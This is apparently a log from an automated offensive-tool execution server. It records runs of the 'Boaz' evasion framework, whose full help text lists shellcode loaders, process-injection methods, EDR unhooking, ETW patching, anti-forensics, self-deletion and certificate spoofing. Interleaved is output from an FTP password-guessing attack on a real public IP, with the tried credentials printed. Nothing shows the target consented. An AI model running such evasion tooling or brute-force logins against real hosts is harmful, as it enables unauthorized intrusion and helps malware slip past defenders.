2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-sgn]
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-e {uuid,xor,mac,ipv4,base45,base64,base58,aes,des,chacha,rc4,aes2,ascon}]
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-c {mingw,pluto,akira}] [-mllvm MLLVM] [-obf] [-obf_api]
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-w [SYSWHISPER]] [-entropy {1,2}] [-b [BINDER]]
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-wm [WATERMARK]] [-d] [-af] [-icon] [-s [SIGN_CERTIFICATE]]
2025-10-24 01:42:23,134 - __main__ - WARNING - 📥 STDERR: [-dh]
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: [0;36m
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: ╭━━╮╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: ┃╭╮┃╱╱╱╱╱╱╱╱╱╱╱┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: ┃╰╯╰┳━━┳━━┳━━━╮┃╰━━┳╮╭┳━━┳━━┳┳━━┳━╮╱╰╯┃┃┣┻━┳━━┫┃
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: ┃╭━╮┃╭╮┃╭╮┣━━┃┃┃╭━━┫╰╯┃╭╮┃━━╋┫╭╮┃╭╮╮╱╱┃┃┃╭╮┃╭╮┃┃
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: ┃╰━╯┃╰╯┃╭╮┃┃━━┫┃╰━━╋╮╭┫╭╮┣━━┃┃╰╯┃┃┃┃╱╱┃┃┃╰╯┃╰╯┃╰╮
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: ╰━━━┻━━┻╯╰┻━━━╯╰━━━╯╰╯╰╯╰┻━━┻┻━━┻╯╰╯╱╱╰╯╰━━┻━━┻━╯
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: .@@@@@@&%#%
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: .@@@@@@@%#(
2025-10-24 01:42:23,134 - __main__ - INFO - 📤 STDOUT: #@@@@@@@&#((
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: @@@@@@@@@&&%%%
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: %#%%@@@@%(/*,                               ..
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: %**,,,,*****.                          #%##((////(.
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: .//***//*/                          ,%%%##(((((((#(
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: .%&%%/,,,**(#%&,                       */(##########%.
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: &@@@&&%(//   *%&@#                      ********/%%%%%
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: &@@@&%%&%(/   *%&@&,.                     *//////#&&&&#
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: .@@@&&%##&%#(/ /&&&&*.                  .*  ***/(#&&&#
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: @@@@&&%%%%&&%%%&&*               ((  .(    /***.   .,,*
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: *%&&&&&%#/,                    .//,(((/(%#/(.**,.*,,,*,
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: /**,,/(((#&&&%, *%*******.
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: ,//*/%(((%&(// ....,/**//.
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: (*((((/////////////.
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: .,*//**,
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: [0;35mBoaz mini-evasion framework is starting...
2025-10-24 01:42:23,135 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:42:23,135 - __main__ - WARNING - 📥 STDERR: Boaz.py: error: unrecognized arguments: --list-loaders
2025-10-24 01:42:23,181 - __main__ - INFO - 🧹 CLEANUP: Process 44758 removed from registry
2025-10-24 01:42:23,181 - __main__ - WARNING - ⚠️  WARNING: Command completed with errors | Exit Code: 2 | Duration: 0.58s
2025-10-24 01:42:23,181 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:42:23,181 - __main__ - INFO - [1m│[0m [38;5;196m📊 FINAL RESULTS ❌[0m
2025-10-24 01:42:23,181 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:42:23,181 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py --lis...
2025-10-24 01:42:23,181 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 0.58s
2025-10-24 01:42:23,181 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 2294 bytes
2025-10-24 01:42:23,181 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m 2
2025-10-24 01:42:23,181 - __main__ - INFO - [1m│[0m [38;5;196m📈 Status:[0m FAILED | Cached: Yes
2025-10-24 01:42:23,181 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:42:23,181 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:42:23] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:42:23,805 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m17.9%[0m ETA: 246.3s Speed: 1 B/s | 53.7s | PID: 44673
2025-10-24 01:42:24,607 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.2%[0m ETA: 245.5s Speed: 1 B/s | 54.5s | PID: 44673
2025-10-24 01:42:25,408 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.4%[0m ETA: 244.7s Speed: 1 B/s | 55.3s | PID: 44673
2025-10-24 01:42:26,209 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m18.7%[0m ETA: 243.9s Speed: 1 B/s | 56.1s | PID: 44673
2025-10-24 01:42:26,712 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2016 (Incorrect: )
2025-10-24 01:42:27,010 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.0%[0m ETA: 243.1s Speed: 1 B/s | 56.9s | PID: 44673
2025-10-24 01:42:27,811 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.2%[0m ETA: 242.3s Speed: 1 B/s | 57.7s | PID: 44673
2025-10-24 01:42:28,612 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.5%[0m ETA: 241.5s Speed: 1 B/s | 58.5s | PID: 44673
2025-10-24 01:42:29,416 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m19.8%[0m ETA: 240.7s Speed: 1 B/s | 59.3s | PID: 44673
2025-10-24 01:42:29,758 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2015 (Incorrect: )
2025-10-24 01:42:30,217 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.0%[0m ETA: 239.9s Speed: 1 B/s | 60.1s | PID: 44673
2025-10-24 01:42:31,018 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.3%[0m ETA: 239.1s Speed: 1 B/s | 60.9s | PID: 44673
2025-10-24 01:42:31,820 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.6%[0m ETA: 238.3s Speed: 1 B/s | 61.7s | PID: 44673
2025-10-24 01:42:32,620 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m20.8%[0m ETA: 237.5s Speed: 1 B/s | 62.5s | PID: 44673
2025-10-24 01:42:32,887 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2014 (Incorrect: )
2025-10-24 01:42:33,422 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.1%[0m ETA: 236.7s Speed: 1 B/s | 63.3s | PID: 44673
2025-10-24 01:42:34,114 - __main__ - INFO - 🔍 Cache MISS for command: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -h
2025-10-24 01:42:34,115 - __main__ - INFO - 🚀 EXECUTING: cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py -h
2025-10-24 01:42:34,115 - __main__ - INFO - ⏱️  TIMEOUT: 300s | PID: Starting...
2025-10-24 01:42:34,116 - __main__ - INFO - 🆔 PROCESS: PID 44797 started
2025-10-24 01:42:34,116 - __main__ - INFO - 🆔 REGISTERED: Process 44797 - cd /opt/hexstrike-ai/BOAZ_beta && python3 Boaz.py ...
2025-10-24 01:42:34,118 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m0.0%[0m Speed: 0 B/s | 0.0s | PID: 44797
2025-10-24 01:42:34,224 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████[38;5;240m░░░░░░░░░░░░░░░░░░░░░░░░[0m] [38;5;160m21.4%[0m ETA: 235.9s Speed: 1 B/s | 64.1s | PID: 44673
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: [0;36m
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: ╭━━╮╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: ┃╭╮┃╱╱╱╱╱╱╱╱╱╱╱┃╭━━╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: ┃╰╯╰┳━━┳━━┳━━━╮┃╰━━┳╮╭┳━━┳━━┳┳━━┳━╮╱╰╯┃┃┣┻━┳━━┫┃
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: ┃╭━╮┃╭╮┃╭╮┣━━┃┃┃╭━━┫╰╯┃╭╮┃━━╋┫╭╮┃╭╮╮╱╱┃┃┃╭╮┃╭╮┃┃
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: ┃╰━╯┃╰╯┃╭╮┃┃━━┫┃╰━━╋╮╭┫╭╮┣━━┃┃╰╯┃┃┃┃╱╱┃┃┃╰╯┃╰╯┃╰╮
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: ╰━━━┻━━┻╯╰┻━━━╯╰━━━╯╰╯╰╯╰┻━━┻┻━━┻╯╰╯╱╱╰╯╰━━┻━━┻━╯
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: .@@@@@@&%#%
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: .@@@@@@@%#(
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: #@@@@@@@&#((
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: @@@@@@@@@&&%%%
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: %#%%@@@@%(/*,                               ..
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: %**,,,,*****.                          #%##((////(.
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: .//***//*/                          ,%%%##(((((((#(
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: .%&%%/,,,**(#%&,                       */(##########%.
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: &@@@&&%(//   *%&@#                      ********/%%%%%
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: &@@@&%%&%(/   *%&@&,.                     *//////#&&&&#
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: .@@@&&%##&%#(/ /&&&&*.                  .*  ***/(#&&&#
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: @@@@&&%%%%&&%%%&&*               ((  .(    /***.   .,,*
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: *%&&&&&%#/,                    .//,(((/(%#/(.**,.*,,,*,
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: /**,,/(((#&&&%, *%*******.
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: ,//*/%(((%&(// ....,/**//.
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: (*((((/////////////.
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: .,*//**,
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,652 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [0;35mBoaz mini-evasion framework is starting...
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [0m
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: usage: Boaz.py [-h] [-f INPUT_FILE] [-o OUTPUT_FILE] [-divide] [-l LOADER]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-dll] [-cpl] [-sleep] [-a] [-cfg] [-etw] [-j] [-dream [DREAM]]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-u] [-g] [-t {donut,pe2sh,rc4,amber,shoggoth,augment}] [-sd]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-sgn]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-e {uuid,xor,mac,ipv4,base45,base64,base58,aes,des,chacha,rc4,aes2,ascon}]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-c {mingw,pluto,akira}] [-mllvm MLLVM] [-obf] [-obf_api]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-w [SYSWHISPER]] [-entropy {1,2}] [-b [BINDER]]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-wm [WATERMARK]] [-d] [-af] [-icon] [-s [SIGN_CERTIFICATE]]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: [-dh]
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: Process loader and shellcode.
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: options:
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -h, --help            show this help message and exit
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -f, --input-file INPUT_FILE
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: Path to binary.exe
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -o, --output-file OUTPUT_FILE
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: Optional: Specify the output file path and name. If
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: not provided, a random file name will be used in the
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: ./output directory.
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -divide               Divide flag (True or False)
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -l, --loader LOADER   Loader number (must be a non-negative integer)
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -dll                  Compile the output as a DLL instead of an executable,
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: can be run with rundll32.exe
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -cpl                  Compile the output as a CPL instead of an executable,
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: can be run with control.exe
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -sleep                Obfuscation Sleep flag with random sleep time (True or
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: False)
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -a, --anti-emulation  Anti-emulation flag (True or False)
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -cfg, --control-flow-guard
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: Disable Control Flow Guard (CFG) for the loader
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: template.
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -etw                  Enable ETW patching functionality
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -j, --junk-api        Insert junk API function call at a random location in
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: the main function (5 API functions)
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -dream [DREAM]        Optional: Sleep with encrypted stacks for specified
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: time in milliseconds. Defaults to 1500ms if not
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: provided.
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -u, --api-unhooking   Enable API unhooking functionality
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -g, --god-speed       Enable advanced unhooking technique Peruns Fart (God
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: Speed)
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -t, --shellcode-type {donut,pe2sh,rc4,amber,shoggoth,augment}
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: Shellcode generation tool: donut (default), pe2sh,
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: rc4, amber, shoggoth or augmented loader
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -sd, --star_dust      Enable Stardust PIC generator, input should be .bin
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -sgn, --encode-sgn    Encode the generated shellcode using sgn tool.
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: -e, --encoding {uuid,xor,mac,ipv4,base45,base64,base58,aes,des,chacha,rc4,aes2,ascon}
2025-10-24 01:42:34,653 - __main__ - INFO - 📤 STDOUT: Encoding type: uuid, xor, mac, ip4, base45, base64,
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: base58, AES, DES, chacha, RC4 and aes2. aes2 is a
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: devide and conquer AES decryption to bypass logical
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: path hijacking. Other encoders are under development.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -c, --compiler {mingw,pluto,akira}
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: Compiler choice: mingw (default), pluto, or akira
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -mllvm MLLVM          LLVM passes for Pluto or Akira compiler
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -obf, --obfuscate     Enable obfuscation of codebase (source code)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -obf_api, --obfuscate-api
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: Enable obfuscation of API calls in ntdll and kernel32.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -w, --syswhisper [SYSWHISPER]
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: Optional: Use SysWhisper for direct syscalls. 1 for
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: random syscall jumps (default), 2 for compiling with
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: MingW and NASM.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -entropy {1,2}        Entropy level for post-processing the output binary. 1
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: for null_byte.py, 2 for pokemon.py
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -b, --binder [BINDER]
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: Optional: Path to a utility for binding. Defaults to
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: binder/calc.exe if not provided.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -wm, --watermark [WATERMARK]
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: Add watermark to the binary (0 for False, 1 or no
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: value for True)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -d, --self-deletion   Enable self-deletion of the binary after execution
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -af, --anti-forensic  Enable anti-forensic functions to clean the execution
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: traces.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -icon                 Enable icon for the output binary.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -s, --sign-certificate [SIGN_CERTIFICATE]
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: Optional: Sign the output binary and copy metadata
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: from another binary to your output. If a website or
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: filepath is provided, use it. Defaults to interactive
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: mode if no argument is provided.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: -dh, --detect-hooks   Compile a small tool called check_hook.exe for
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: detecting inline/IAT/EAT hooks. This tool can detect
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: both native API and export function hooks.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: loader modules:
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 1.  Proxy syscall --> Custom call Stack + indirect syscall with threadless execution (local injection)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 2.  APC test alert
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 3.  Sifu syscall
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 4.  UUID manual injection
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 5.  Remote mockingJay
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 6.  Local thread hijacking
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 7.  Function pointer invoke local injection
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 8.  Ninja_syscall2
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 9.  RW local mockingJay
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 10. Ninja syscall 1
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 11. Sifu Divide and Conquer syscall
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 12. [Your custom loader here]
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 14. Exit the process without executing the injected shellcode
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 15. Syswhispers2 classic native API calls
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 16. Classic userland API calls (VirtualAllcEx --> WriteProcessMemory --> CreateRemoteThread)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 17. Sifu SysCall with Divide and Conquer
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 18. Classic userland API calls with WriteProcessMemoryAPC
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 19. DLL overloading
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 20. Stealth new Injection (WriteProcessMemoryAPC + DLL overloading)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 21.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 22. Advanced indirect custom call stack syscall, using VEH-->VCH logic and manually remove handlers from the list.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 23.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 24. Classic native API
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 25.
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 26. Stealth new Injection (3 WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 27. Stealth new Injection (3 Custom WriteProcessMemoryAPC variants + custom DLL overloading + custom dynamic API-hashing + Halo's gate patching)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 28. Halo's gate patching syscall injection + Custom write code to Process Memory by either MAC or UUID convertor + invisible dynamic loading (no loadModuleHandle, loadLibrary, GetProcessAddress)
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 29. Classic indirect syscall
2025-10-24 01:42:34,654 - __main__ - INFO - 📤 STDOUT: 30. Classic direct syscall
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 31. MAC address injection
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 32. Stealth new injection (Advanced)
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 33. Indirect Syscall + Halo gate + Custom Call Stack
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 34. EDR syscall no.1 + Halo gate + EDR Call Stack 1
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 36. EDR syscall no.2 + Halo gate + EDR Call Stack 2
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 37. Stealth new loader (Advanced, evade memory scan)
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 38. A novel PI with APC write method and phantom DLL overloading execution (CreateThread pointed to a memory address of UNMODIFIED DLL.)
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 39. Custom Stack PI (remote) with threadless execution
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 40. Custom Stack PI (remote) Threadless DLL Notification Execution
2025-10-24 01:42:34,655 - __main__ - INFO - 📤 STDOUT: 41. Custom Stack PI (remote) with Decoy code execution
